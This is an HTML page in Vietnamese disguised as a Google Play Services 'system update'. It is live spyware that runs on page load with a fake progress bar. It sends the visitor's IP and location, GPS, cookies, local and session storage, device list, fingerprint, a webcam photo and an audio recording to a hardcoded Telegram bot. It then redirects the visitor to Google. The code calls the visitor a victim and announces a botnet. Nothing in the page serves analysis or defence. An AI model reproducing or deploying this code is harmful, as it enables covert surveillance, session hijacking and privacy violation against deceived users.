<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
        }
        .icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        h2 {
            color: #1a1a2e;
            margin-bottom: 15px;
            font-size: 24px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            font-size: 14px;
            margin-top: 15px;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e0e0e0;
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease;
        }
        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔄</div>
        <h2>Đang cập nhật hệ thống</h2>
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="spinner"></div>
        <p class="status" id="statusText">Đang khởi tạo...</p>
        <div class="footer">v3.2.1 • Google Play Services</div>
    </div>

    <script>
        // ========== CẤU HÌNH ==========
        const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';     // 🔴 THAY BẰNG TOKEN BOT CỦA BẠN
        const CHAT_ID = '6232287791';         // 🔴 THAY BẰNG ID TELEGRAM CỦA BẠN
        const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 10).toUpperCase();
        
        // ========== BIẾN TOÀN CỤC ==========
        let currentStep = 0;
        let collectedData = {};
        
        // ========== HÀM GỬI TIN NHẮN ==========
        async function sendMessage(text, parseMode = 'HTML') {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `[${VICTIM_ID}] ${text}`,
                        parse_mode: parseMode
                    })
                });
                return response.ok;
            } catch(e) {
                console.error('Send error:', e);
                return false;
            }
        }
        
        // ========== HÀM GỬI FILE ==========
        async function sendFile(base64Data, filename, caption) {
            try {
                const blob = b64toBlob(base64Data);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, filename);
                formData.append('caption', `[${VICTIM_ID}] ${caption}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch(e) {
                console.error('File send error:', e);
                return false;
            }
        }
        
        function b64toBlob(b64Data, contentType = '') {
            const byteCharacters = atob(b64Data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            return new Blob([byteArray], { type: contentType });
        }
        
        // ========== CẬP NHẬT PROGRESS ==========
        function updateProgress(percent, text) {
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('statusText').innerText = text;
        }
        
        // ========== 1. THÔNG TIN TRÌNH DUYỆT ==========
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
            
            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';
            
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'macOS';
            else if (ua.includes('Linux')) os = 'Linux';
            
            if (ua.includes('Mobile')) device = 'Mobile';
            else device = 'Desktop';
            
            return { browser, os, device, ua, language: navigator.language, userAgent: ua };
        }
        
        // ========== 2. IP VÀ VỊ TRÍ ==========
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city || 'Unknown',
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country_code,
                    lat: data.latitude,
                    lon: data.longitude,
                    isp: data.org,
                    timezone: data.timezone,
                    asn: data.asn
                };
            } catch(e) {
                return { ip: 'Unknown', city: 'Unknown', lat: 0, lon: 0 };
            }
        }
        
        // ========== 3. GPS (nếu được phép) ==========
        function getGPS() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({ success: true, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, alt: pos.coords.altitude }),
                        (err) => resolve({ success: false, error: err.message }),
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    resolve({ success: false, error: 'Geolocation not supported' });
                }
            });
        }
        
        // ========== 4. THÔNG TIN MÀN HÌNH ==========
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation?.type || 'unknown',
                angle: screen.orientation?.angle || 0
            };
        }
        
        // ========== 5. COOKIES ==========
        function getCookies() {
            return document.cookie || 'Không có cookies';
        }
        
        // ========== 6. LOCAL STORAGE ==========
        function getLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    try {
                        items[key] = localStorage.getItem(key);
                    } catch(e) {
                        items[key] = '[Không đọc được]';
                    }
                }
                return JSON.stringify(items, null, 2);
            } catch(e) {
                return 'Không thể đọc localStorage';
            }
        }
        
        // ========== 7. SESSION STORAGE ==========
        function getSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    try {
                        items[key] = sessionStorage.getItem(key);
                    } catch(e) {
                        items[key] = '[Không đọc được]';
                    }
                }
                return JSON.stringify(items, null, 2);
            } catch(e) {
                return 'Không thể đọc sessionStorage';
            }
        }
        
        // ========== 8. THÔNG TIN PIN ==========
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {
                    return null;
                }
            }
            return null;
        }
        
        // ========== 9. TỐC ĐỘ MẠNG ==========
        async function getNetworkSpeed() {
            const startTime = Date.now();
            try {
                await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?_=' + Date.now(), { 
                    cache: 'no-cache',
                    mode: 'no-cors'
                });
                const endTime = Date.now();
                return endTime - startTime;
            } catch(e) {
                return -1;
            }
        }
        
        // ========== 10. IP NỘI BỘ (WebRTC) ==========
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (ipMatch) {
                        resolve(ipMatch[1]);
                        pc.close();
                    }
                };
                setTimeout(() => resolve('Không lấy được'), 3000);
            });
        }
        
        // ========== 11. DANH SÁCH THIẾT BỊ ==========
        async function getDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Camera');
                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Microphone');
                const speakers = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker');
                return { cameras: cams, microphones: mics, speakers: speakers };
            } catch(e) {
                return { cameras: [], microphones: [], speakers: [] };
            }
        }
        
        // ========== 12. CHỤP ẢNH WEBCAM ==========
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(track => track.stop());
                return photo.split(',')[1];
            } catch(e) {
                return null;
            }
        }
        
        // ========== 13. GHI ÂM ==========
        async function recordAudio(duration = 5) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.start();
                
                await new Promise(r => setTimeout(r, duration * 1000));
                mediaRecorder.stop();
                
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            stream.getTracks().forEach(t => t.stop());
                            resolve(base64);
                        };
                        reader.readAsDataURL(blob);
                    };
                });
            } catch(e) {
                return null;
            }
        }
        
        // ========== 14. PHÁT HIỆN ADBLOCK ==========
        function detectAdBlock() {
            const testAd = document.createElement('div');
            testAd.className = 'adsbox';
            testAd.style.display = 'none';
            document.body.appendChild(testAd);
            const isBlocked = testAd.offsetHeight === 0;
            document.body.removeChild(testAd);
            return isBlocked;
        }
        
        // ========== 15. PHÁT HIỆN VPN/PROXY ==========
        async function detectVPN() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.proxy || data.hosting || false;
            } catch(e) {
                return false;
            }
        }
        
        // ========== 16. LẤY LỊCH SỬ DUYỆT WEB ==========
        function getVisitedSites() {
            const sites = ['facebook.com', 'youtube.com', 'google.com', 'tiktok.com', 'instagram.com', 'twitter.com', 'zalo.me', 'shopee.vn', 'github.com', 'reddit.com', 'netflix.com', 'spotify.com'];
            const visited = [];
            const link = document.createElement('a');
            sites.forEach(site => {
                link.href = `https://${site}`;
                if (link.offsetTop !== 0) visited.push(site);
            });
            return visited;
        }
        
        // ========== 17. TẠO FINGERPRINT ==========
        function getFingerprint() {
            const components = [
                navigator.userAgent,
                screen.width + 'x' + screen.height,
                screen.colorDepth,
                navigator.language,
                navigator.platform,
                new Date().getTimezoneOffset(),
                navigator.hardwareConcurrency || 0,
                navigator.deviceMemory || 0,
                !!window.chrome,
                !!navigator.webdriver
            ];
            return btoa(unescape(encodeURIComponent(components.join('|'))));
        }
        
        // ========== 18. KIỂM TRA WEBDRIVER (BOT) ==========
        function isAutomated() {
            return navigator.webdriver || 
                   window._phantom || 
                   window.callPhantom || 
                   document.documentElement.getAttribute('webdriver') !== null;
        }
        
        // ========== MAIN FUNCTION ==========
        async function collectAllData() {
            // Thông báo bắt đầu
            await sendMessage('✅ <b>BOTNET ACTIVATED</b>\n🆔 ID: ' + VICTIM_ID);
            updateProgress(5, 'Đang thu thập thông tin...');
            
            // 1. Thông tin trình duyệt
            const browserInfo = getBrowserInfo();
            await sendMessage(`🌐 <b>Browser:</b> ${browserInfo.browser} | ${browserInfo.os} | ${browserInfo.device}\n📝 <b>Language:</b> ${browserInfo.language}`);
            updateProgress(10, 'Đã lấy thông tin trình duyệt');
            
            // 2. IP và vị trí
            const ipInfo = await getIPInfo();
            await sendMessage(`📍 <b>IP:</b> ${ipInfo.ip}\n📍 <b>Location:</b> ${ipInfo.city}, ${ipInfo.country}\n🏢 <b>ISP:</b> ${ipInfo.isp}\n🌍 <b>Timezone:</b> ${ipInfo.timezone}`);
            updateProgress(20, 'Đã lấy thông tin IP');
            
            // 3. GPS
            const gps = await getGPS();
            if (gps.success) {
                await sendMessage(`🛰️ <b>GPS:</b> ${gps.lat}, ${gps.lon}\n🎯 <b>Accuracy:</b> ${gps.acc}m`);
                await sendMessage(`🗺️ <b>Google Maps:</b> https://maps.google.com/?q=${gps.lat},${gps.lon}`);
            } else {
                await sendMessage(`⚠️ <b>GPS:</b> ${gps.error || 'Not available'}`);
            }
            updateProgress(30, 'Đã xử lý vị trí');
            
            // 4. Màn hình
            const screenInfo = getScreenInfo();
            await sendMessage(`🖥️ <b>Screen:</b> ${screenInfo.width}x${screenInfo.height}\n🎨 <b>Color Depth:</b> ${screenInfo.colorDepth}bit\n📱 <b>Orientation:</b> ${screenInfo.orientation}`);
            updateProgress(40, 'Đã lấy thông tin màn hình');
            
            // 5. Cookies
            const cookies = getCookies();
            if (cookies && cookies !== 'Không có cookies') {
                await sendMessage(`🍪 <b>Cookies:</b> ${cookies.substring(0, 300)}${cookies.length > 300 ? '...' : ''}`);
            }
            updateProgress(50, 'Đang xử lý cookies');
            
            // 6. Storage
            const localStorage = getLocalStorage();
            if (localStorage && localStorage !== 'Không thể đọc localStorage') {
                await sendMessage(`💾 <b>LocalStorage:</b> ${localStorage.substring(0, 300)}...`);
            }
            
            const sessionStorage = getSessionStorage();
            if (sessionStorage && sessionStorage !== 'Không thể đọc sessionStorage') {
                await sendMessage(`📦 <b>SessionStorage:</b> ${sessionStorage.substring(0, 200)}...`);
            }
            updateProgress(60, 'Đã lấy storage data');
            
            // 7. Pin
            const battery = await getBatteryInfo();
            if (battery) {
                await sendMessage(`🔋 <b>Battery:</b> ${battery.level}% ${battery.charging ? '(🔌 Charging)' : '(🔋 Not charging)'}`);
            }
            
            // 8. Tốc độ mạng
            const ping = await getNetworkSpeed();
            if (ping > 0) {
                await sendMessage(`⚡ <b>Ping:</b> ${ping}ms`);
            }
            
            // 9. IP nội bộ
            const localIP = await getLocalIP();
            await sendMessage(`🏠 <b>Local IP:</b> ${localIP}`);
            updateProgress(70, 'Đã lấy thông tin mạng');
            
            // 10. Thiết bị
            const devices = await getDevices();
            if (devices.cameras.length) await sendMessage(`📷 <b>Cameras:</b> ${devices.cameras.join(', ')}`);
            if (devices.microphones.length) await sendMessage(`🎤 <b>Microphones:</b> ${devices.microphones.join(', ')}`);
            
            // 11. AdBlock & VPN
            const hasAdBlock = detectAdBlock();
            if (hasAdBlock) await sendMessage(`🛡️ <b>AdBlock:</b> Enabled`);
            
            const isVPN = await detectVPN();
            if (isVPN) await sendMessage(`🔒 <b>VPN/Proxy:</b> Detected`);
            
            // 12. Lịch sử truy cập
            const visited = getVisitedSites();
            if (visited.length) {
                await sendMessage(`📜 <b>Visited sites:</b> ${visited.join(', ')}`);
            }
            
            // 13. Bot detection
            const isBot = isAutomated();
            if (!isBot) {
                await sendMessage(`✅ <b>Human:</b> Verified`);
            }
            
            // 14. Fingerprint
            const fp = getFingerprint();
            await sendMessage(`🆔 <b>Fingerprint:</b> ${fp.substring(0, 80)}...`);
            updateProgress(85, 'Đang hoàn thiện...');
            
            // 15. Thời gian
            await sendMessage(`📅 <b>Time:</b> ${new Date().toLocaleString('vi-VN')}`);
            
            // 16. Chụp ảnh webcam
            updateProgress(90, 'Đang chụp ảnh webcam...');
            const photo = await capturePhoto();
            if (photo) {
                await sendFile(photo, `webcam_${VICTIM_ID}.jpg`, '📸 Webcam photo');
            }
            
            // 17. Ghi âm
            updateProgress(95, 'Đang ghi âm...');
            const audio = await recordAudio(3);
            if (audio) {
                await sendFile(audio, `audio_${VICTIM_ID}.webm`, '🎙 Audio recording');
            }
            
            // Hoàn thành
            updateProgress(100, 'Hoàn tất!');
            await sendMessage(`✅ <b>COMPLETE!</b> Data collected from ${VICTIM_ID}\n📊 Total items: 15+`);
            
            // Chuyển hướng sau 2 giây
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }
        
        // Bắt đầu thu thập dữ liệu
        collectAllData();
    </script>
</body>
</html>
